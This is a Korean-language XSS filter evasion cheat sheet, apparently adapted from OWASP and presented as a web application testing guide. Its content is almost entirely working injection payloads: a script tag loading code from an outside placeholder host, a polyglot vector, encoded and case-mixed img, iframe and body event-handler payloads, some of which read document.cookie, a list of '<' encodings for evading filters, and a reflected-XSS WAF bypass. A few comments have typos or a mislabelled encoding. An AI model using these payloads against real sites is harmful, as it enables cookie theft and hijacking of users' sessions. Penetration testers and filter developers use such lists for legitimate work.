## XSS Filter Evasion Cheat Sheet

---

본문은 어플리케이션 보안 테스트 중 `Cross-Site Script`취약점에 대한 테스팅 가이드를 제공한다.

[XSS-Filter-Evasion-Cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet#)





## Basic XSS Test Without Filter Evasion

>아래 구문은 일반적인 `XSS` 자바스크립트 인젝션 구문이다, 또한 대부분이 막혀있으나 제일 먼저 이를 시도할것을 추천한다.
>
>cf) 모던웹에서는 따옴표를 쓰지 않아도 무방하다.
>
>```html
><script src=https:xxx.com></script>
>```





## XSS Locator (Polygot)

---

> 본 구문은 "polygot test XSS payload"내용이다.
>
> 해당 구문은 `html`, `script 문자열`, `javascript`, `url`등 다양한 컨텍스트에서 모두 사용될 수 있다.
>
> ```html
> javscript:/*--></title></style></textarea></sript></xmp>
> <svg/onload='+/"+/onmouseover=1/+/[*/[]/+alert(1)//'>
> ```



## Cheat Sheet

---

>```html
><!-- img 태그를 이용한 XSS -->
><img src="javascript:alert('XSS')">
>
><!-- Quotes & Semicolon을 쓰지 않는 XSS -->
><img src=javascript:alert('XSS')>
>
><!-- 대소문자 필터링 XSS Attack vector -->
><img src=JaVaScRiPt:alert('XSS')>
>
><!-- HTML 엔터티를 이용한 XSS -->
><img src=javascript:alert(&quot;XSS&quot;)> 
>
><!-- 약한 강조를 이용한 난독화 XSS -->
><img src=`javascript:alert('XSS')`>
>만일 쌍따옴표 또는 홑따옴표를 써야하는 경우에는 grave accent를 이용하여 자바스크립트 문자열을 인캡슐래이션 가능.
>-> 대부분의 XSS 필터들이 이걸 모르기 때문에 매우매우 유용함 
>
><!-- a 태그 변형 XSS -->
>\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
>`href` 특성을 skip하여 XXS실행 가능
>
><!-- img 태그 변형 XSS-->
><IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
>본 구문은 HTML태그 파싱을 매우 어렵게 만듬
>    
><!-- fromCharCode 응용 XSS-->
><IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
>어떠한 따옴표도 이용이 불가능한 경우, fromCharCode를 통해 문자열 생성 가능 -> document.cookie같은것.
>    
><!--SRC 도메인을 확인하는 필터를 통과하기 위한 기본 SRC 태그 -->
><IMG SRC=# onmouseover="alert('xxs')">
>본 구문은 대표적인 도메인 필터링을 우회할 수 있다. onmouseover 이벤트 대신 onblur, onclick과 같은 이벤트 또한 사용이 가능하다.
>    
><!-- 기본 SRC 비우기 -->
><IMG SRC= onmouseover="alert('xxs')">
>    
><!-- 의도적 에러 유발을 통한 XSS -->
><IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
>
><!-- IMG 에러 & 경고창 띄우기 인코딩 버전 -->
><img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
>URL percent 인코딩을 적용한 공격구문 -> onerror=javascript:alert(1)
>    
><!-- HTML character encoding -->
><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
>    
><!-- Embedded Tab-->
><img src="jav	ascript:alert("XSS")" onerror=javascript:alert(1)>
>    
><!-- Extraneous Open brakets -->
><<SCRIPT>alert("XSS");//\<</SCRIPT>
>위 벡터는 첫번째 괄호와 마지막 괄호들을 필터링하는 무산시킨다.
>
><!-- End title tag -->
></TITLE><SCRIPT>alert("XSS");</SCRIPT>
>벡터는 타이틀 태그를 닫아 스크립트를 실행시키는 벡터이다.
>    
><!-- Body tag -->
><BODY ONLOAD=alert('XSS')>
>위 벡터는 javascript: , <script>...</script> 와 같은 요소를 필요로 하지 않는다.
>
><!-- Iframe tag -->
><IFRAME SRC="javascript:alert('XSS');"></IFRAME>
>Iframe 태그가 허용되면 수많은 XSS 벡터 시도가 가능하다.
>
><!-- Iframe Event based -->
><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
>Iframe 그리고 나머지 대부분의 엘리먼트들은 이벤트 기반의 공격시도가 가능하다.
>    
>
>```
>
>
>
>**문자열 필터링 우회 sequence**
>
>- 자바스크립트와 HTML 내 '<' 문자의 모든 가능한 조합이며 대체로 박스 밖에서 렌더링 되지만 특정상황에 따라 렌더링이 될 수도 있다.
>
>```html
><
>%3C
>&lt
>&lt;
>&LT
>&LT;
>&#60
>&#060
>&#0060
>&#00060
>&#000060
>&#0000060
>&#60;
>&#060;
>&#0060;
>&#00060;
>&#000060;
>&#0000060;
>&#x3c
>&#x03c
>&#x003c
>&#x0003c
>&#x00003c
>&#x000003c
>&#x3c;
>&#x03c;
>&#x003c;
>&#x0003c;
>&#x00003c;
>&#x000003c;
>&#X3c
>&#X03c
>&#X003c
>&#X0003c
>&#X00003c
>&#X000003c
>&#X3c;
>&#X03c;
>&#X003c;
>&#X0003c;
>&#X00003c;
>&#X000003c;
>&#x3C
>&#x03C
>&#x003C
>&#x0003C
>&#x00003C
>&#x000003C
>&#x3C;
>&#x03C;
>&#x003C;
>&#x0003C;
>&#x00003C;
>&#x000003C;
>&#X3C
>&#X03C
>&#X003C
>&#X0003C
>&#X00003C
>&#X000003C
>&#X3C;
>&#X03C;
>&#X003C;
>&#X0003C;
>&#X00003C;
>&#X000003C;
>\x3c
>\x3C
>\u003c
>\u003C
>```
>
>
>
>**WAF 우회 sheet**
>
>- Stored XSS
>
>  - 공격자가 필터를 통해 XSS 벡터를 밀어넣은 경우 WAF는 공격을 막을 수 없다.
>
>- Reflected XSS
>
>  ```html
>  Example: <script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
>  Exploitation: /?xss=500); alert(document.cookie);//
>  ```







```html
<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>
```

